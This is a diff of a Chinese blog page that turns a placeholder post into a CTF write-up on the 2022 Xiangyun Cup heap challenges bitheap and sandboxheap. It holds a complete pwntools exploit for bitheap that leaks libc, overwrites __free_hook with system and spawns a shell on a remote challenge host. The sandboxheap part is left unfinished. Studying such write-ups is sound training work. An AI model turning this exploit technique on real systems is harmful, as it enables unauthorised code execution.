@@ -16,21 +16,24 @@
   <meta name="author" content="xtxtn">
   <meta name="keywords" content="">
   
-    <meta name="description" content="Hello World">
+    <meta name="description" content="我是先写的sandboxheap，开始还以为sandbox文件是多余的，就直接单独拿sandboxheap去写，就在本地打通后，发现远程是有通过sandbox去执行sandboxheap，当时我就没能写出来。 山重水复疑无路，柳暗花明又一村！没想到bitheap漏洞和sandboxheap一模一样，而且没有sandbox，当时就只写出了bitheap。 漏洞分析这两道题都是一样的漏洞，主要是看懂编">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Hello World">
-<meta property="og:url" content="https://xtxtn.github.io/2022/11/01/Hello-world/index.html">
+<meta property="og:title" content="祥云杯2022 sandboxheap和bitheapk">
+<meta property="og:url" content="https://xtxtn.github.io/2022/11/02/%E7%A5%A5%E4%BA%91%E6%9D%AF-sandboxheap%E5%92%8Cbitheap/index.html">
 <meta property="og:site_name" content="xtxtn&#39;s Blog">
-<meta property="og:description" content="Hello World">
+<meta property="og:description" content="我是先写的sandboxheap，开始还以为sandbox文件是多余的，就直接单独拿sandboxheap去写，就在本地打通后，发现远程是有通过sandbox去执行sandboxheap，当时我就没能写出来。 山重水复疑无路，柳暗花明又一村！没想到bitheap漏洞和sandboxheap一模一样，而且没有sandbox，当时就只写出了bitheap。 漏洞分析这两道题都是一样的漏洞，主要是看懂编">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2022-11-01T02:24:53.720Z">
-<meta property="article:modified_time" content="2022-11-02T08:03:02.158Z">
+<meta property="og:image" content="https://xtxtn.github.io/img/4/Screenshot_20221105_024929.png">
+<meta property="og:image" content="https://xtxtn.github.io/img/4/Screenshot_20221105_025735.png">
+<meta property="article:published_time" content="2022-11-02T08:05:30.729Z">
+<meta property="article:modified_time" content="2022-11-05T07:11:37.851Z">
 <meta property="article:author" content="xtxtn">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://xtxtn.github.io/img/4/Screenshot_20221105_024929.png">
   
   
   
-  <title>Hello World - xtxtn&#39;s Blog</title>
+  <title>祥云杯2022 sandboxheap和bitheapk - xtxtn&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -207,7 +210,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="Hello World"></span>
+            <span id="subtitle" data-typed-text="祥云杯2022 sandboxheap和bitheapk"></span>
           
         </div>
 
@@ -218,8 +221,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2022-11-01 10:24" pubdate>
-          2022年11月1日 上午
+        <time datetime="2022-11-02 16:05" pubdate>
+          2022年11月2日 下午
         </time>
       </span>
     
@@ -230,7 +233,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          10 字
+          2.4k 字
         
       </span>
     
@@ -241,7 +244,7 @@
         
         
         
-          1 分钟
+          20 分钟
         
       </span>
     
@@ -279,12 +282,23 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">Hello World</h1>
+            <h1 style="display: none">祥云杯2022 sandboxheap和bitheapk</h1>
             
             
               <div class="markdown-body">
                 
-                <p>Hello World</p>
+                <p>我是先写的sandboxheap，开始还以为sandbox文件是多余的，就直接单独拿sandboxheap去写，就在本地打通后，发现远程是有通过sandbox去执行sandboxheap，当时我就没能写出来。</p>
+<p>山重水复疑无路，柳暗花明又一村！没想到bitheap漏洞和sandboxheap一模一样，而且没有sandbox，当时就只写出了bitheap。</p>
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>这两道题都是一样的漏洞，主要是看懂编辑函数中的溢出和加密：</p>
+<p>如下图将堆块写入数据的大小乘8 ，然后加1；最后是通过基于输入的8个字符去对堆中的一个字节进行位运算，每个字符可以操作堆中一个字节的一位；最后会多出一个字节影响下一个堆块的size</p>
+<p><img src="/img/4/Screenshot_20221105_024929.png" srcset="/img/loading.gif" lazyload></p>
+<p>如下图sub_C61函数，基于堆块中的字符来位运算，但堆块初始值都是<code>0</code>，最后被写入堆块的也是0  ；如果输入的是<code>\x31</code>字符会让最后被写入堆块的的是1。</p>
+<p><img src="/img/4/Screenshot_20221105_025735.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="bitheap"><a href="#bitheap" class="headerlink" title="bitheap"></a>bitheap</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;bitheap&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;libc-2.27.so&#x27;</span>)<br><span class="hljs-comment">#libc = elf.libc</span><br><span class="hljs-comment">#p = process([&#x27;./sandbox&#x27;,&#x27;./sandboxheap&#x27;])</span><br><span class="hljs-comment">#p = process(&#x27;./bitheap&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;39.106.13.71&#x27;</span>,<span class="hljs-number">42991</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index, size</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Your choice:&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Size:&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Your choice:&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;Content:&#x27;</span>, content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Your choice:&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Your choice:&#x27;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">key</span>(<span class="hljs-params">pay</span>):<br>    pay = u64(pay)<br>    result = <span class="hljs-string">b&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>        a = pay &amp; <span class="hljs-number">0xff</span><br>        <span class="hljs-comment">#print(hex(a))</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>            b = <span class="hljs-number">1</span> &lt;&lt; i<br>            <span class="hljs-keyword">if</span> b &amp; a == <span class="hljs-number">0</span>:<br>                result += <span class="hljs-string">b&#x27;\x00&#x27;</span><br>            <span class="hljs-keyword">else</span> :<br>                result += <span class="hljs-string">b&#x27;\x31&#x27;</span><br>        pay = pay &gt;&gt; <span class="hljs-number">8</span><br>    <span class="hljs-keyword">return</span> result<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">8</span>):<br>    add(i, <span class="hljs-number">0xb0</span>)<br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0xb8</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">8</span>):<br>    delete(i)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">9</span>):<br>    add(i, <span class="hljs-number">0x80</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>,<span class="hljs-number">9</span>):<br>    delete(i)<br><br>delete(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x90</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>,<span class="hljs-number">9</span>):<br>    add(i, <span class="hljs-number">0x90</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>,<span class="hljs-number">9</span>):<br>    delete(i)<br>add(<span class="hljs-number">2</span>, <span class="hljs-number">0x18</span>)<br><br><br>delete(<span class="hljs-number">0</span>)<br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x80</span> + key(p64(<span class="hljs-number">0xc0</span>)) + <span class="hljs-string">b&#x27;\x00&#x27;</span><br>edit(<span class="hljs-number">2</span>, payload)<br>delete(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x70</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x10</span>)<br><br>show(<span class="hljs-number">2</span>)<br>leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libcbase = leak - <span class="hljs-number">96</span> - <span class="hljs-number">0x10</span> - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libcbase))<br>free_hook = libcbase + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>sys_addr = libcbase + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>add(<span class="hljs-number">3</span>, <span class="hljs-number">0x10</span>)<br><br>delete(<span class="hljs-number">1</span>)<br>delete(<span class="hljs-number">3</span>)<br>payload = key(p64(free_hook))<br>edit(<span class="hljs-number">2</span>, payload)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x10</span>)<br>edit(<span class="hljs-number">1</span>, key(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>))<br>add(<span class="hljs-number">3</span>, <span class="hljs-number">0x10</span>)<br>edit(<span class="hljs-number">3</span>, key(p64(sys_addr)))<br>delete(<span class="hljs-number">1</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="sandboxheap"><a href="#sandboxheap" class="headerlink" title="sandboxheap"></a>sandboxheap</h3><p>未完待续……</p>
 
                 
               </div>
@@ -302,8 +316,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>Hello World</div>
-      <div>https://xtxtn.github.io/2022/11/01/Hello-world/</div>
+      <div>祥云杯2022 sandboxheap和bitheapk</div>
+      <div>https://xtxtn.github.io/2022/11/02/祥云杯-sandboxheap和bitheap/</div>
     </div>
     <div class="license-meta">
       
@@ -315,7 +329,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2022年11月1日</div>
+          <div>2022年11月2日</div>
         </div>
       
       
@@ -359,9 +373,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2022/11/01/Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B-pwn-ez_kiwi/" title="Dest0g3 520迎新赛 pwn ez_kiwi">
+                      <a href="/2022/11/05/%E5%A4%A9%E6%B4%A5%E5%B8%82%E6%94%BB%E9%98%B2/" title="2022天津市大学生信息安全网络攻防决赛 pwn">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">Dest0g3 520迎新赛 pwn ez_kiwi</span>
+                        <span class="hidden-mobile">2022天津市大学生信息安全网络攻防决赛 pwn</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -369,8 +383,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2022/10/31/2022-10-31/" title="">
-                        <span class="hidden-mobile"></span>
+                      <a href="/2022/11/02/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9BWeek4-pwn-%E8%BF%99%E6%98%AF%E5%A0%86/" title="NewStarCTF 公开赛Week4 pwn 这是堆🐎">
+                        <span class="hidden-mobile">NewStarCTF 公开赛Week4 pwn 这是堆🐎</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
